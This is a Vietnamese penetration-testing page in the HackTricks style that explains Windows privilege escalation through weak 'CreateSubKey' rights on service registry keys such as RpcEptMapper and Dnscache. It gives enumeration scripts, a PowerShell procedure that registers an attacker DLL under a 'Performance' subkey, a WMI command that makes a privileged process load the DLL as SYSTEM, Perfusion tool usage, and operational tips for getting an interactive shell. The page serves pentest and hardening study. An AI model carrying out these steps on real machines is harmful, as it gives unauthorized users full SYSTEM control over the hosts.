# Quyền AppendData/AddSubdirectory trên Registry của dịch vụ

{{#include ../../banners/hacktricks-training.md}}

**Bài đăng gốc là** [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)<sup>[[3]](#references)</sup>

## Tóm tắt

Nếu bạn chỉ có quyền **`Create Subkey`** / **`AppendData/AddSubdirectory`** trên một khóa registry của dịch vụ, đây vẫn là một manh mối tốt để privesc. Thông thường, bạn **không thể** ghi đè trực tiếp `ImagePath`, `ServiceDll` hoặc các value hiện có khác, nhưng vẫn có thể tạo một khóa con **`Performance`** bên dưới:

- **`HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`**
- **`HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`**
- Bất kỳ khóa **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`** nào khác mà token của bạn có quyền **`KEY_CREATE_SUB_KEY`**

Mấu chốt là Windows vẫn hỗ trợ mô hình đăng ký **PerfLib V1** cũ. Nếu dịch vụ có khóa con **`Performance`**, Windows có thể tải một DLL từ đó khi một consumer của performance counter yêu cầu dữ liệu.

Theo tài liệu của Microsoft, cấu hình đăng ký tối thiểu là:<sup>[[1]](#references)</sup>

```text
HKLM\SYSTEM\CurrentControlSet\Services\<service>\Performance
  Library = C:\Path\payload.dll
  Open    = OpenPerfData
  Collect = CollectPerfData
  Close   = ClosePerfData
```

Vì vậy, bài học tấn công là: **đừng bỏ qua phát hiện về registry của service chỉ vì bạn chỉ có `CreateSubKey` thay vì `SetValue`**.<sup>[[3]](#references)</sup>

## Vì sao như vậy là đủ để thực thi mã

Subkey `Performance` thường **không tồn tại mặc định** trên các service này, nên **`KEY_CREATE_SUB_KEY`** là primitive bạn cần. Sau khi key được tạo và chứa `Library`/`Open`/`Collect`/`Close`, bất kỳ **performance counter consumer** nào cũng có thể kích hoạt việc load DLL.<sup>[[3]](#references)</sup>

Một số chi tiết quan trọng:

- Giá trị **`Library`** có thể trỏ đến **đường dẫn DLL đầy đủ**.
- DLL phải export **`OpenPerfData`**, **`CollectPerfData`** và **`ClosePerfData`**, đồng thời trả về `ERROR_SUCCESS`.
- Mã chạy trong **context của consumer**, **không nhất thiết trong chính tiến trình của service có lỗ hổng**.
- Trong trường hợp kinh điển `RpcEptMapper` / `Dnscache`, một **truy vấn hiệu năng WMI** có thể khiến **`wmiprvse.exe`** load DLL với quyền **`NT AUTHORITY\SYSTEM`**.

Đây là lý do primitive này dễ bị bỏ sót khi triage: key của service cha không "có toàn quyền ghi", nhưng vẫn có thể bị weaponize.

## Liệt kê nhanh

Kiểm tra thủ công bằng **AccessChk**:

```bash
accesschk.exe -k -w hklm\system\currentcontrolset\services\rpceptmapper
accesschk.exe -k -w hklm\system\currentcontrolset\services\dnscache
```

Ví dụ PowerShell để tìm các principal có đặc quyền thấp được cấp quyền **`CreateSubKey`** trên các khóa dịch vụ:

```powershell
Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services | ForEach-Object {
  $weak = (Get-Acl $_.PSPath).Access | Where-Object {
    $_.AccessControlType -eq 'Allow' -and
    ($_.RegistryRights -band [System.Security.AccessControl.RegistryRights]::CreateSubKey) -eq [System.Security.AccessControl.RegistryRights]::CreateSubKey -and
    $_.IdentityReference -match 'Users|Authenticated Users|INTERACTIVE|Network Configuration Operators'
  }
  if ($weak) {
    [pscustomobject]@{Service=$_.PSChildName; Principals=($weak.IdentityReference -join ', '); Rights=($weak.RegistryRights -join '; ')}
  }
}
```

Công cụ hữu ích:

- **PrivescCheck**: `Get-ModifiableRegistryPath` được tạo riêng để phát hiện loại vấn đề này.<sup>[[3]](#references)</sup>
- **SharpUp**: `SharpUp.exe audit ModifiableServiceRegistryKeys`
- **Perfusion**: tự động hóa việc thả DLL, đăng ký `Performance`, kích hoạt WMI, sao chép token và dọn dẹp trên các mục tiêu cũ dễ bị tấn công (ví dụ: `Perfusion.exe -c cmd -i -k Dnscache`).<sup>[[4]](#references)</sup>

## Quy trình khai thác

Tạo khóa con `Performance` và điền các giá trị cần thiết:<sup>[[3]](#references)</sup>

```powershell
$svc = 'RpcEptMapper' # or Dnscache / NetBT / another vulnerable service
$k = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc\Performance"
New-Item $k -Force | Out-Null
New-ItemProperty $k -Name Library -Value "$pwd\payload.dll" -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Open -Value 'OpenPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Collect -Value 'CollectPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Close -Value 'ClosePerfData' -PropertyType String -Force | Out-Null
```

Sau đó kích hoạt một consumer hiệu năng **được cấp đặc quyền**. Ví dụ kinh điển là truy vấn WMI trên các lớp `Win32_Perf*`:<sup>[[3]](#references)</sup>

```powershell
powershell.exe -NoProfile -Command "Get-WmiObject -List | Where-Object { $_.Name -like 'Win32_Perf*' } | Out-Null"
```

Ghi chú vận hành:

- Khởi chạy **`perfmon.exe`** hữu ích để xác minh rằng việc đăng ký counter là chính xác, nhưng thường chỉ tải DLL trong **ngữ cảnh người dùng của chính bạn**.
- Để thực hiện LPE thực sự, hãy kích hoạt một consumer có đặc quyền như **WMI**.
- Nếu tự viết exploit, việc khởi chạy trực tiếp `cmd.exe` bên trong DLL thường khiến bạn có shell trong **session 0**. `Perfusion` xử lý việc này bằng cách nhân bản token có đặc quyền vào một process được tạo ở trạng thái suspended trong session của attacker.<sup>[[4]](#references)</sup>
- Chọn kiến trúc DLL khớp với consumer mục tiêu (**x64 trên hệ thống x64**).

## Ghi chú về phiên bản / diễn biến gần đây

Trong lịch sử, các weak key có sẵn là:<sup>[[4]](#references)</sup>

- **Windows 7 / Windows Server 2008 R2**: `RpcEptMapper` và `Dnscache`
- **Windows 8 / Windows Server 2012**: `RpcEptMapper`

`Perfusion` ghi nhận rằng các bản cập nhật **tháng 4 năm 2021** đã loại bỏ con đường khai thác dễ dàng trên **Windows 8 / Windows Server 2012** đã được cập nhật, trong khi **Windows 7 / Windows Server 2008 R2** vẫn có thể bị khai thác thông qua **`Dnscache`**.<sup>[[4]](#references)</sup>

Primitive này **không chỉ thuộc về lịch sử**. Vào **tháng 1 năm 2025**, Microsoft đã vá một vấn đề AD DS liên quan, trong đó các thành viên của **`Network Configuration Operators`** có thể tạo subkey bên dưới **`Dnscache`** và **`NetBT`**; ý tưởng **đăng ký DLL qua Performance counter** tương tự có thể được tái sử dụng để đạt quyền **SYSTEM** trên các hệ thống được hỗ trợ.<sup>[[2]](#references)</sup>

Vì vậy, bài học hiện đại mang tính tổng quát là: bất cứ khi nào một principal có đặc quyền thấp có quyền **`CreateSubKey`** trên **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`**, hãy kiểm tra xem chỉ cần một khóa con **`Performance`** có đủ hay không trước khi bỏ qua phát hiện này.

## References

- [1] [Microsoft Learn - Tạo khóa Performance của ứng dụng](https://learn.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key)
- [2] [BirkeP - Lỗ hổng nâng cao đặc quyền trong Active Directory Domain Services (CVE-2025-21293)](https://birkep.github.io/posts/Windows-LPE/)
- [3] [itm4n - EoP do quyền Registry không an toàn của dịch vụ Windows RpcEptMapper](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)
- [4] [itm4n - Perfusion (exploit cho lỗ hổng quyền của khóa Registry RpcEptMapper)](https://github.com/itm4n/Perfusion)
{{#include ../../banners/hacktricks-training.md}}
